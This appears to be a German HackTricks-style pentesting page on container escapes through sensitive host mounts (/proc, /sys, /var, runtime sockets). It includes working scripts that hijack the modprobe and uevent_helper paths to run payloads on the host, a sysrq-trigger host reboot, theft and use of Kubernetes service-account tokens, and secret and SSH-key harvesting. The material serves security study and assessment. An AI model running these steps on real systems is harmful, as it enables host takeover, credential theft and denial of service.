# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Host-Mounts sind eine der wichtigsten praktischen Angriffsflächen für container escapes, weil sie oft eine sorgfältig isolierte Prozessansicht wieder in direkte Sichtbarkeit von Host-Ressourcen zurückführen. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind-Mounts von `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state oder gerätebezogenen Pfaden können Kernel-Kontrollen, Anmeldeinformationen, Dateisysteme benachbarter Container und Laufzeit-Management-Schnittstellen offenlegen.

Diese Seite existiert getrennt von den einzelnen Schutzseiten, weil das Missbrauchsmodell bereichsübergreifend ist. Ein beschreibbarer Host-Mount ist zum Teil wegen Mount-Namespaces, zum Teil wegen User-Namespaces, zum Teil wegen AppArmor- oder SELinux-Abdeckung und zum Teil wegen des genau exponierten Host-Pfads gefährlich. Wenn man es als eigenes Thema behandelt, lässt sich die Angriffsfläche deutlich besser durchdenken.

## `/proc`-Exponierung

procfs enthält sowohl gewöhnliche Prozessinformationen als auch wirkungsvolle Kernel-Steuerinterfaces. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Ansicht, die unerwartet beschreibbare proc-Einträge freigibt, kann daher zu Informationsoffenlegung, Denial-of-Service oder direkter Code-Ausführung auf dem Host führen.

Hochwertige procfs-Pfade beinhalten:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Beginnen Sie damit zu prüfen, welche hochprioritären procfs-Einträge sichtbar oder schreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus verschiedenen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können, wenn sie schreibbar sind, zu host code-execution-Pfaden werden. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind mächtige Quellen für Reconnaissance bei Kernel-Exploits. `sched_debug` und `mountinfo` geben Prozess-, cgroup- und Filesystem-Kontext preis, die beim Rekonstruieren der Host-Topologie aus dem Container heraus helfen können.

Der praktische Wert jedes Pfads ist unterschiedlich, und alle gleich zu behandeln erschwert die Triage:

- `/proc/sys/kernel/core_pattern`
Wenn schreibbar, ist dies einer der wirkungsstärksten procfs-Pfade, weil der Kernel nach einem Crash einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf einen Payload zeigt, der in seinem Overlay oder in einem gemounteten Host-Pfad gespeichert ist, kann oft host code execution erlangen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein konkretes Beispiel.
- `/proc/sys/kernel/modprobe`
Dieser Pfad steuert den Userspace-Helper, den der Kernel aufruft, wenn Module geladen werden müssen. Wenn er vom Container beschreibbar ist und im Host-Kontext interpretiert wird, kann er zu einem weiteren host code-execution-Primitive werden. Besonders interessant ist das in Kombination mit einer Möglichkeit, den Helper-Pfad auszulösen.
- `/proc/sys/vm/panic_on_oom`
Dies ist normalerweise kein sauberer Escape-Primitive, kann aber Speicherknappheit in einen hostweiten Denial of Service verwandeln, indem OOM-Bedingungen in Kernel-Panic-Verhalten umgewandelt werden.
- `/proc/sys/fs/binfmt_misc`
Wenn die Registrierungs-Schnittstelle schreibbar ist, kann ein Angreifer einen Handler für einen gewählten Magic-Wert registrieren und Host-Kontext-Execution erhalten, wenn eine passende Datei ausgeführt wird.
- `/proc/config.gz`
Nützlich für die Triage bei Kernel-Exploits. Hilft zu bestimmen, welche Subsysteme, Mitigations und optionalen Kernel-Features aktiviert sind, ohne Host-Paket-Metadaten zu benötigen.
- `/proc/sysrq-trigger`
Vorwiegend ein Denial-of-Service-Pfad, aber ein sehr ernster. Er kann den Host sofort neu starten, zum Panic bringen oder anderweitig stören.
- `/proc/kmsg`
Gibt Kernel-Ringbuffer-Nachrichten preis. Nützlich für Host-Fingerprinting, Crash-Analyse und in manchen Umgebungen für leaking information, die bei Kernel-Exploitation hilfreich sind.
- `/proc/kallsyms`
Wertvoll, wenn lesbar, da es exportierte Kernel-Symbolinformationen offenlegt und helfen kann, Annahmen zur Adress-Randomisierung bei der Entwicklung von Kernel-Exploits zu durchbrechen.
- `/proc/[pid]/mem`
Dies ist eine direkte Prozess-Memory-Schnittstelle. Wenn der Zielprozess mit den erforderlichen ptrace-ähnlichen Bedingungen erreichbar ist, kann sie das Lesen oder Verändern des Speichers eines anderen Prozesses erlauben. Die reale Auswirkung hängt stark von Credentials, `hidepid`, Yama und ptrace-Einschränkungen ab, sodass es ein mächtiger, aber bedingter Pfad ist.
- `/proc/kcore`
Stellt eine core-image-ähnliche Sicht auf den Systemspeicher zur Verfügung. Die Datei ist riesig und umständlich zu nutzen, aber wenn sie in nennenswertem Umfang lesbar ist, deutet das auf eine schlecht geschützte Host-Memory-Fläche hin.
- `/proc/kmem` and `/proc/mem`
Historisch wirkungsstarke rohe Memory-Schnittstellen. Auf vielen modernen Systemen sind sie deaktiviert oder stark eingeschränkt, aber wenn sie vorhanden und nutzbar sind, sollten sie als kritische Findings behandelt werden.
- `/proc/sched_debug`
Leaks scheduling and task information, die Host-Prozess-Identitäten offenbaren kann, selbst wenn andere Prozessansichten sauberer erscheinen als erwartet.
- `/proc/[pid]/mountinfo`
Extrem nützlich, um zu rekonstruieren, wo der Container auf dem Host tatsächlich liegt, welche Pfade overlay-backed sind und ob ein schreibbares Mount Host-Inhalte oder nur die Container-Layer repräsentiert.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, nutze sie, um den Host-Pfad des Container-Dateisystems zu rekonstruieren:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, weil zahlreiche host-execution-Tricks erfordern, einen Pfad innerhalb des container in den entsprechenden Pfad aus Sicht des host umzuwandeln.

### Vollständiges Beispiel: `modprobe` Helper Path Abuse

Wenn `/proc/sys/kernel/modprobe` aus dem container beschreibbar ist und der helper path im Kontext des host interpretiert wird, kann er auf ein vom Angreifer kontrolliertes payload umgeleitet werden:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Der genaue Auslöser hängt vom target und dem kernel-Verhalten ab, aber wichtig ist, dass ein beschreibbarer helper-Pfad einen zukünftigen kernel helper-Aufruf auf vom Angreifer kontrollierten host-path-Inhalt umleiten kann.

### Vollständiges Beispiel: Kernel Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn das Ziel eher die Bewertung der Exploitability als ein sofortiges escape ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen festzustellen, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernel-Meldungen interessanten Zustand preisgeben und welche Kernel-Features oder Mitigations kompiliert wurden. Die Auswirkungen führen normalerweise nicht zu einem direkten escape, können aber die Triage von Kernel-Schwachstellen erheblich verkürzen.

### Vollständiges Beispiel: SysRq Host Reboot

Wenn `/proc/sysrq-trigger` beschreibbar ist und für den Host sichtbar ist:
```bash
echo b > /proc/sysrq-trigger
```
Die Folge ist ein sofortiger Neustart des Hosts. Dies ist kein subtiles Beispiel, zeigt aber deutlich, dass eine procfs-Freilegung weitaus ernster sein kann als die Offenlegung von Informationen.

## `/sys` Freilegung

sysfs macht große Mengen an Kernel- und Gerätezustand zugänglich. Einige sysfs-Pfade sind hauptsächlich für fingerprinting nützlich, während andere die Ausführung von Helfern, das Verhalten von Geräten, die Konfiguration von Security-Modulen oder den Firmware-Zustand beeinflussen können.

Besonders relevante sysfs-Pfade sind:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus verschiedenen Gründen relevant. `/sys/class/thermal` kann das Thermomanagement-Verhalten beeinflussen und damit in schlecht freigelegten Umgebungen die Stabilität des Hosts beeinträchtigen. `/sys/kernel/vmcoreinfo` kann crash-dump- und kernel-layout-Informationen leak, die beim low-level host fingerprinting helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird; unerwarteter Zugriff dort kann MAC-bezogenen Zustand offenlegen oder verändern. EFI-Variablenpfade können firmware-gestützte Boot-Einstellungen beeinflussen, wodurch sie deutlich ernster sind als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, weil es bewusst eine entwicklerorientierte Schnittstelle mit deutlich geringeren Sicherheitsannahmen als gehärtete, produktionsnahe kernel APIs darstellt.

Nützliche Befehle zur Überprüfung dieser Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
- /sys/kernel/security kann aufzeigen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche sichtbar ist, in einer Weise, die auf dem Host hätte bleiben sollen.
- /sys/kernel/debug ist oft der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` gemountet und lesbar oder schreibbar ist, ist mit einer großen kernel-nahen Angriffsfläche zu rechnen, deren genaues Risiko von den aktivierten Debug-Nodes abhängt.
- Die Offenlegung von EFI-Variablen ist seltener, aber wenn vorhanden hat sie hohe Auswirkungen, weil sie firmware-gestützte Einstellungen betrifft statt gewöhnlicher Laufzeitdateien.
- /sys/class/thermal ist hauptsächlich relevant für die Stabilität des Hosts und die Hardware-Interaktion, nicht für elegante shell-ähnliche Escapes.
- /sys/kernel/vmcoreinfo dient hauptsächlich als Quelle für Host-Fingerprinting und Crash-Analyse und ist nützlich, um den Kernel-Zustand auf niedriger Ebene zu verstehen.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel einen vom Angreifer kontrollierten Helper ausführen, wenn ein `uevent` ausgelöst wird:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Der Grund, warum das funktioniert, ist, dass der Helper-Pfad aus Sicht des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der Helper im Host-Kontext und nicht innerhalb des aktuellen Containers.

## `/var` Offenlegung

Das Einbinden des Host-`/var` in einen Container wird oft unterschätzt, weil es nicht so dramatisch wirkt wie das Mounten von `/`. In der Praxis kann es jedoch ausreichen, um Laufzeitsockets, container snapshot directories, von kubelet verwaltete pod-Volumes, projected service-account tokens und benachbarte Anwendungsdateisysteme zu erreichen. Auf modernen Nodes befindet sich in `/var` oft der betrieblich interessanteste Containerzustand.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann oft die projected tokens anderer Pods und Overlay-Snapshot-Inhalte lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie beantworten, ob der mount nur langweilige Anwendungsdaten oder hochwirksame Cluster-Anmeldeinformationen offenlegt. Ein lesbares service-account token kann lokale Codeausführung sofort in Kubernetes API-Zugriff verwandeln.

Wenn das Token vorhanden ist, validiere, was es erreichen kann, statt bei der Token-Erkennung aufzuhören:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die Auswirkungen hier können weit größer sein als ein lokaler Node-Zugriff. Ein Token mit weitreichenden RBAC-Rechten kann ein gemountetes `/var` in eine Cluster-weite Kompromittierung verwandeln.

### Docker- und containerd-Beispiel

Auf Docker-Hosts liegen die relevanten Daten oft unter `/var/lib/docker`, während sie auf containerd-gestützten Kubernetes-Nodes unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das gemountete `/var` beschreibbare Snapshot-Inhalte eines anderen Workloads offenlegt, kann ein Angreifer möglicherweise Anwendungsdateien verändern, Webinhalte platzieren oder Startskripte ändern, ohne die aktuelle Container-Konfiguration zu berühren.

Konkrete Missbrauchsideen, sobald beschreibbare Snapshot-Inhalte gefunden werden:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei Haupt-Auswirkungsfamilien des gemounteten `/var` zeigen: application tampering, secret recovery und lateral movement into neighboring workloads.

## Laufzeit-Sockets

Sensible Host-Mounts enthalten oft Laufzeit-Sockets statt ganzer Verzeichnisse. Diese sind so wichtig, dass sie hier ausdrücklich nochmals erwähnt werden sollten:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige exploitation flows, sobald einer dieser Sockets gemountet ist.

Als schnelles erstes Interaktionsmuster:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn eine dieser Methoden erfolgreich ist, ist der Weg vom "mounted socket" zum Starten eines privilegierteren gleichrangigen Containers normalerweise deutlich kürzer als bei einem Kernel-Breakout-Pfad.

## Mount-Related CVEs

Host-Mounts überschneiden sich auch mit Runtime-Schwachstellen. Wichtige aktuelle Beispiele sind:

- `CVE-2024-21626` in `runc`, bei dem ein leaked Dateideskriptor für ein Verzeichnis das Arbeitsverzeichnis auf das Host-Dateisystem setzen könnte.
- `CVE-2024-23651` und `CVE-2024-23653` in BuildKit, bei denen OverlayFS copy-up races während Builds Schreibvorgänge auf Host-Pfaden erzeugen könnten.
- `CVE-2024-1753` in Buildah und Podman build flows, bei denen manipulierte bind mounts während des Builds `/` als read-write offenlegen könnten.
- `CVE-2024-40635` in containerd, bei dem ein großer `User`-Wert in UID-0-Verhalten überlaufen könnte.

Diese CVEs sind hier relevant, weil sie zeigen, dass die Handhabung von Mounts nicht nur eine Frage der Operator-Konfiguration ist. Auch die Runtime selbst kann mount-getriebene Escape-Bedingungen einführen.

## Checks

Verwenden Sie diese Befehle, um schnell die Mounts mit dem höchsten Risiko zu lokalisieren:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var` und runtime sockets sind alles hochprioritäre Befunde.
- Beschreibbare proc/sys-Einträge bedeuten oft, dass der Mount hostweite Kernel-Kontrollen exponiert statt einer sicheren Container-Ansicht.
- Gemountete `/var`-Pfade verdienen eine Überprüfung von Zugangsdaten und benachbarten Workloads, nicht nur eine Filesystem-Überprüfung.
{{#include ../../../banners/hacktricks-training.md}}
